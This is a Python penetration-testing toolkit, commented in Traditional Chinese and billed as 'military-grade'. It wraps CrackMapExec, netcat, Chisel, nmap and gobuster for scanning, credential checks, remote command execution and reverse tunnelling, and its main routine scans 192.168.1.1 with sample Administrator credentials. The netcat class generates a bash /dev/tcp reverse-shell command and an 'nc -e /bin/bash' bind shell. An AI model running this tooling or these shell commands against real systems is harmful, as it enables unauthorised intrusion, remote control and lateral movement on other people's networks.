#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
軍事級通用滲透工具系統
實作 CrackMapExec, Netcat/Chisel, Nmap 等工具功能
"""

import os
import sys
import json
import time
import hashlib
import base64
import struct
import socket
import threading
import subprocess
import nmap
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import logging

# 設定日誌
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class ToolType(Enum):
    """工具類型枚舉"""
    CRACKMAPEXEC = "crackmapexec"
    NETCAT = "netcat"
    CHISEL = "chisel"
    NMAP = "nmap"
    MASSCAN = "masscan"
    RUSTSCAN = "rustscan"
    GOBUSTER = "gobuster"
    DIRB = "dirb"
    SQLMAP = "sqlmap"
    NIKTO = "nikto"

@dataclass
class ScanResult:
    """掃描結果資料結構"""
    target: str
    port: int
    service: str
    version: str
    state: str
    banner: str
    vulnerability: str = None
    confidence: float = 0.0
    timestamp: str = None

@dataclass
class ExploitResult:
    """漏洞利用結果資料結構"""
    target: str
    exploit: str
    success: bool
    payload: str
    output: str
    timestamp: str = None

class CrackMapExecTools:
    """CrackMapExec 工具整合"""
    
    def __init__(self):
        self.cme_path = "crackmapexec"
        self.protocols = ['smb', 'winrm', 'mssql', 'ldap', 'ssh', 'rdp']
    
    def smb_scan(self, target: str, username: str = None, password: str = None, hash_value: str = None) -> Dict[str, Any]:
        """執行 SMB 掃描"""
        try:
            cmd = [self.cme_path, 'smb', target]
            
            if username and password:
                cmd.extend(['-u', username, '-p', password])
            elif username and hash_value:
                cmd.extend(['-u', username, '-H', hash_value])
            else:
                cmd.append('--shares')
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'credentials_valid': self._parse_smb_output(result.stdout)
            }
        except Exception as e:
            logger.error(f"SMB 掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def winrm_scan(self, target: str, username: str, password: str) -> Dict[str, Any]:
        """執行 WinRM 掃描"""
        try:
            cmd = [self.cme_path, 'winrm', target, '-u', username, '-p', password]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'winrm_accessible': 'WINRM' in result.stdout.upper()
            }
        except Exception as e:
            logger.error(f"WinRM 掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def mssql_scan(self, target: str, username: str, password: str) -> Dict[str, Any]:
        """執行 MSSQL 掃描"""
        try:
            cmd = [self.cme_path, 'mssql', target, '-u', username, '-p', password]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'mssql_accessible': 'MSSQL' in result.stdout.upper()
            }
        except Exception as e:
            logger.error(f"MSSQL 掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def ldap_scan(self, target: str, username: str, password: str) -> Dict[str, Any]:
        """執行 LDAP 掃描"""
        try:
            cmd = [self.cme_path, 'ldap', target, '-u', username, '-p', password]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'ldap_accessible': 'LDAP' in result.stdout.upper()
            }
        except Exception as e:
            logger.error(f"LDAP 掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def execute_command(self, target: str, username: str, password: str, command: str, protocol: str = 'smb') -> Dict[str, Any]:
        """執行遠程命令"""
        try:
            cmd = [self.cme_path, protocol, target, '-u', username, '-p', password, '-x', command]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'command_executed': command
            }
        except Exception as e:
            logger.error(f"命令執行錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _parse_smb_output(self, output: str) -> bool:
        """解析 SMB 輸出判斷憑證是否有效"""
        return 'Pwn3d!' in output or 'OK' in output

class NetcatTools:
    """Netcat 工具整合"""
    
    def __init__(self):
        self.netcat_path = "nc"
        self.listeners = []
    
    def create_listener(self, port: int, protocol: str = 'tcp') -> Dict[str, Any]:
        """創建監聽器"""
        try:
            if protocol == 'tcp':
                cmd = [self.netcat_path, '-l', '-p', str(port)]
            else:  # udp
                cmd = [self.netcat_path, '-l', '-u', '-p', str(port)]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            listener_info = {
                'pid': process.pid,
                'port': port,
                'protocol': protocol,
                'status': 'listening'
            }
            self.listeners.append(listener_info)
            
            return {
                'success': True,
                'listener': listener_info,
                'message': f'監聽器已啟動在端口 {port}'
            }
        except Exception as e:
            logger.error(f"創建監聽器錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def connect_to_target(self, target: str, port: int, protocol: str = 'tcp') -> Dict[str, Any]:
        """連接到目標"""
        try:
            if protocol == 'tcp':
                cmd = [self.netcat_path, target, str(port)]
            else:  # udp
                cmd = [self.netcat_path, '-u', target, str(port)]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'connection_established': result.returncode == 0
            }
        except Exception as e:
            logger.error(f"連接目標錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def reverse_shell(self, target: str, port: int) -> Dict[str, Any]:
        """建立反向 Shell"""
        try:
            # 目標系統上的命令: nc -e /bin/bash target_ip port
            shell_command = f"bash -i >& /dev/tcp/{target}/{port} 0>&1"
            
            return {
                'success': True,
                'shell_command': shell_command,
                'target': target,
                'port': port,
                'message': '反向 Shell 命令已生成'
            }
        except Exception as e:
            logger.error(f"反向 Shell 錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def bind_shell(self, port: int) -> Dict[str, Any]:
        """建立綁定 Shell"""
        try:
            # 目標系統上的命令: nc -l -p port -e /bin/bash
            shell_command = f"nc -l -p {port} -e /bin/bash"
            
            return {
                'success': True,
                'shell_command': shell_command,
                'port': port,
                'message': '綁定 Shell 命令已生成'
            }
        except Exception as e:
            logger.error(f"綁定 Shell 錯誤: {e}")
            return {'success': False, 'error': str(e)}

class ChiselTools:
    """Chisel 工具整合"""
    
    def __init__(self):
        self.chisel_path = "chisel"
        self.tunnels = []
    
    def start_server(self, port: int = 8080) -> Dict[str, Any]:
        """啟動 Chisel 伺服器"""
        try:
            cmd = [self.chisel_path, 'server', '--port', str(port), '--reverse']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            server_info = {
                'pid': process.pid,
                'port': port,
                'status': 'running'
            }
            
            return {
                'success': True,
                'server': server_info,
                'message': f'Chisel 伺服器已啟動在端口 {port}'
            }
        except Exception as e:
            logger.error(f"啟動 Chisel 伺服器錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def create_tunnel(self, server: str, local_port: int, remote_port: int) -> Dict[str, Any]:
        """創建隧道"""
        try:
            cmd = [
                self.chisel_path, 'client', server,
                f'{local_port}:localhost:{remote_port}'
            ]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            tunnel_info = {
                'pid': process.pid,
                'local_port': local_port,
                'remote_port': remote_port,
                'server': server,
                'status': 'active'
            }
            self.tunnels.append(tunnel_info)
            
            return {
                'success': True,
                'tunnel': tunnel_info,
                'message': f'隧道已建立: {local_port} -> {server}:{remote_port}'
            }
        except Exception as e:
            logger.error(f"創建隧道錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def reverse_tunnel(self, server: str, remote_port: int, local_port: int) -> Dict[str, Any]:
        """創建反向隧道"""
        try:
            cmd = [
                self.chisel_path, 'client', server,
                f'R:{remote_port}:localhost:{local_port}'
            ]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            tunnel_info = {
                'pid': process.pid,
                'local_port': local_port,
                'remote_port': remote_port,
                'server': server,
                'type': 'reverse',
                'status': 'active'
            }
            self.tunnels.append(tunnel_info)
            
            return {
                'success': True,
                'tunnel': tunnel_info,
                'message': f'反向隧道已建立: {server}:{remote_port} -> localhost:{local_port}'
            }
        except Exception as e:
            logger.error(f"創建反向隧道錯誤: {e}")
            return {'success': False, 'error': str(e)}

class NmapTools:
    """Nmap 工具整合"""
    
    def __init__(self):
        self.nm = nmap.PortScanner()
        self.scan_results = []
    
    def port_scan(self, target: str, ports: str = "1-1000", scan_type: str = "syn") -> Dict[str, Any]:
        """執行端口掃描"""
        try:
            logger.info(f"開始掃描 {target} 端口 {ports}")
            
            if scan_type == "syn":
                scan_args = "-sS"
            elif scan_type == "tcp":
                scan_args = "-sT"
            elif scan_type == "udp":
                scan_args = "-sU"
            elif scan_type == "ack":
                scan_args = "-sA"
            else:
                scan_args = "-sS"
            
            self.nm.scan(target, ports, arguments=scan_args)
            
            results = []
            for host in self.nm.all_hosts():
                for proto in self.nm[host].all_protocols():
                    ports_info = self.nm[host][proto]
                    for port in ports_info:
                        result = ScanResult(
                            target=host,
                            port=port,
                            service=ports_info[port]['name'],
                            version=ports_info[port].get('version', ''),
                            state=ports_info[port]['state'],
                            banner=ports_info[port].get('product', ''),
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.scan_results.append(result)
            
            return {
                'success': True,
                'results': [self._scan_result_to_dict(r) for r in results],
                'total_ports': len(results),
                'open_ports': len([r for r in results if r.state == 'open'])
            }
        except Exception as e:
            logger.error(f"端口掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def service_scan(self, target: str, ports: str = "1-1000") -> Dict[str, Any]:
        """執行服務掃描"""
        try:
            logger.info(f"開始服務掃描 {target}")
            
            self.nm.scan(target, ports, arguments="-sV -sC")
            
            results = []
            for host in self.nm.all_hosts():
                for proto in self.nm[host].all_protocols():
                    ports_info = self.nm[host][proto]
                    for port in ports_info:
                        result = ScanResult(
                            target=host,
                            port=port,
                            service=ports_info[port]['name'],
                            version=ports_info[port].get('version', ''),
                            state=ports_info[port]['state'],
                            banner=ports_info[port].get('product', ''),
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.scan_results.append(result)
            
            return {
                'success': True,
                'results': [self._scan_result_to_dict(r) for r in results],
                'services_found': len(set(r.service for r in results if r.service != 'unknown'))
            }
        except Exception as e:
            logger.error(f"服務掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def vulnerability_scan(self, target: str, ports: str = "1-1000") -> Dict[str, Any]:
        """執行漏洞掃描"""
        try:
            logger.info(f"開始漏洞掃描 {target}")
            
            # 使用 NSE 腳本進行漏洞掃描
            self.nm.scan(target, ports, arguments="--script vuln -sV")
            
            results = []
            vulnerabilities = []
            
            for host in self.nm.all_hosts():
                for proto in self.nm[host].all_protocols():
                    ports_info = self.nm[host][proto]
                    for port in ports_info:
                        port_info = ports_info[port]
                        if 'script' in port_info:
                            for script_name, script_output in port_info['script'].items():
                                if 'vuln' in script_name.lower() or 'exploit' in script_name.lower():
                                    vulnerabilities.append({
                                        'port': port,
                                        'script': script_name,
                                        'output': script_output,
                                        'severity': self._assess_vulnerability_severity(script_output)
                                    })
                        
                        result = ScanResult(
                            target=host,
                            port=port,
                            service=port_info['name'],
                            version=port_info.get('version', ''),
                            state=port_info['state'],
                            banner=port_info.get('product', ''),
                            vulnerability=len([v for v in vulnerabilities if v['port'] == port]) > 0,
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.scan_results.append(result)
            
            return {
                'success': True,
                'results': [self._scan_result_to_dict(r) for r in results],
                'vulnerabilities': vulnerabilities,
                'total_vulnerabilities': len(vulnerabilities)
            }
        except Exception as e:
            logger.error(f"漏洞掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def os_detection(self, target: str) -> Dict[str, Any]:
        """執行作業系統檢測"""
        try:
            logger.info(f"開始作業系統檢測 {target}")
            
            self.nm.scan(target, arguments="-O")
            
            results = []
            for host in self.nm.all_hosts():
                if 'osmatch' in self.nm[host]:
                    for osmatch in self.nm[host]['osmatch']:
                        results.append({
                            'target': host,
                            'os_name': osmatch['name'],
                            'accuracy': osmatch['accuracy'],
                            'osclass': osmatch.get('osclass', [])
                        })
            
            return {
                'success': True,
                'results': results,
                'os_detected': len(results) > 0
            }
        except Exception as e:
            logger.error(f"作業系統檢測錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _assess_vulnerability_severity(self, output: str) -> str:
        """評估漏洞嚴重性"""
        output_lower = output.lower()
        if any(keyword in output_lower for keyword in ['critical', 'high', 'exploit']):
            return 'HIGH'
        elif any(keyword in output_lower for keyword in ['medium', 'warning']):
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _scan_result_to_dict(self, result: ScanResult) -> Dict[str, Any]:
        """將掃描結果轉換為字典"""
        return {
            'target': result.target,
            'port': result.port,
            'service': result.service,
            'version': result.version,
            'state': result.state,
            'banner': result.banner,
            'vulnerability': result.vulnerability,
            'confidence': result.confidence,
            'timestamp': result.timestamp
        }

class GobusterTools:
    """Gobuster 工具整合"""
    
    def __init__(self):
        self.gobuster_path = "gobuster"
    
    def directory_scan(self, target: str, wordlist: str = None, extensions: str = None) -> Dict[str, Any]:
        """執行目錄掃描"""
        try:
            cmd = [self.gobuster_path, 'dir', '-u', target]
            
            if wordlist:
                cmd.extend(['-w', wordlist])
            else:
                cmd.extend(['-w', '/usr/share/wordlists/dirb/common.txt'])
            
            if extensions:
                cmd.extend(['-x', extensions])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            directories = self._parse_gobuster_output(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'directories_found': directories,
                'total_directories': len(directories)
            }
        except Exception as e:
            logger.error(f"目錄掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def subdomain_scan(self, target: str, wordlist: str = None) -> Dict[str, Any]:
        """執行子域名掃描"""
        try:
            cmd = [self.gobuster_path, 'dns', '-d', target]
            
            if wordlist:
                cmd.extend(['-w', wordlist])
            else:
                cmd.extend(['-w', '/usr/share/wordlists/subdomains-top1million-5000.txt'])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            subdomains = self._parse_gobuster_subdomain_output(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'subdomains_found': subdomains,
                'total_subdomains': len(subdomains)
            }
        except Exception as e:
            logger.error(f"子域名掃描錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _parse_gobuster_output(self, output: str) -> List[Dict[str, str]]:
        """解析 Gobuster 輸出"""
        directories = []
        lines = output.split('\n')
        
        for line in lines:
            if 'Status:' in line and 'Size:' in line:
                parts = line.split()
                if len(parts) >= 3:
                    directories.append({
                        'path': parts[0],
                        'status': parts[1].replace('Status:', ''),
                        'size': parts[2].replace('Size:', '')
                    })
        
        return directories
    
    def _parse_gobuster_subdomain_output(self, output: str) -> List[str]:
        """解析 Gobuster 子域名輸出"""
        subdomains = []
        lines = output.split('\n')
        
        for line in lines:
            if 'Found:' in line:
                subdomain = line.split('Found:')[1].strip()
                subdomains.append(subdomain)
        
        return subdomains

class MilitaryPenetrationTools:
    """軍事級通用滲透工具主類別"""
    
    def __init__(self):
        self.crackmapexec = CrackMapExecTools()
        self.netcat = NetcatTools()
        self.chisel = ChiselTools()
        self.nmap = NmapTools()
        self.gobuster = GobusterTools()
        self.scan_log = []
    
    def comprehensive_scan(self, target: str, credentials: Dict[str, str] = None) -> Dict[str, Any]:
        """執行綜合掃描"""
        results = {}
        
        # 1. 端口掃描
        logger.info("執行端口掃描...")
        results['port_scan'] = self.nmap.port_scan(target)
        
        # 2. 服務掃描
        logger.info("執行服務掃描...")
        results['service_scan'] = self.nmap.service_scan(target)
        
        # 3. 漏洞掃描
        logger.info("執行漏洞掃描...")
        results['vulnerability_scan'] = self.nmap.vulnerability_scan(target)
        
        # 4. 作業系統檢測
        logger.info("執行作業系統檢測...")
        results['os_detection'] = self.nmap.os_detection(target)
        
        # 5. 目錄掃描
        logger.info("執行目錄掃描...")
        results['directory_scan'] = self.gobuster.directory_scan(target)
        
        # 6. 如果有憑證，執行認證掃描
        if credentials:
            logger.info("執行認證掃描...")
            results['smb_scan'] = self.crackmapexec.smb_scan(
                target, 
                credentials.get('username'), 
                credentials.get('password')
            )
        
        return {
            'success': True,
            'results': results,
            'summary': self._generate_scan_summary(results)
        }
    
    def _generate_scan_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """生成掃描摘要"""
        summary = {
            'total_scans': len(results),
            'successful_scans': sum(1 for r in results.values() if r.get('success', False)),
            'open_ports': 0,
            'vulnerabilities_found': 0,
            'services_identified': 0,
            'directories_found': 0
        }
        
        for scan_name, result in results.items():
            if result.get('success', False):
                if 'open_ports' in result:
                    summary['open_ports'] += result['open_ports']
                if 'total_vulnerabilities' in result:
                    summary['vulnerabilities_found'] += result['total_vulnerabilities']
                if 'services_found' in result:
                    summary['services_identified'] += result['services_found']
                if 'total_directories' in result:
                    summary['directories_found'] += result['total_directories']
        
        return summary
    
    def get_scan_log(self) -> List[Dict[str, Any]]:
        """獲取掃描日誌"""
        return self.scan_log
    
    def export_results(self, filename: str) -> bool:
        """匯出結果"""
        try:
            data = {
                'scan_log': self.scan_log,
                'nmap_results': [self.nmap._scan_result_to_dict(r) for r in self.nmap.scan_results],
                'timestamp': datetime.now().isoformat(),
                'system_info': {
                    'platform': sys.platform,
                    'python_version': sys.version
                }
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            
            logger.info(f"結果已匯出到: {filename}")
            return True
        except Exception as e:
            logger.error(f"匯出結果錯誤: {e}")
            return False

def main():
    """主程式"""
    print("🔧 軍事級通用滲透工具系統")
    print("=" * 50)
    
    # 初始化系統
    pentest_tools = MilitaryPenetrationTools()
    
    # 測試目標
    test_target = "192.168.1.1"
    test_credentials = {
        'username': 'Administrator',
        'password': 'Password123!'
    }
    
    # 執行綜合掃描測試
    print("開始執行綜合掃描測試...")
    results = pentest_tools.comprehensive_scan(test_target, test_credentials)
    
    print(f"掃描完成，成功: {results['success']}")
    print(f"掃描摘要: {json.dumps(results['summary'], indent=2, ensure_ascii=False)}")
    
    # 匯出結果
    pentest_tools.export_results("penetration_tools_results.json")
    
    print("通用滲透工具系統測試完成！")

if __name__ == "__main__":
    main()

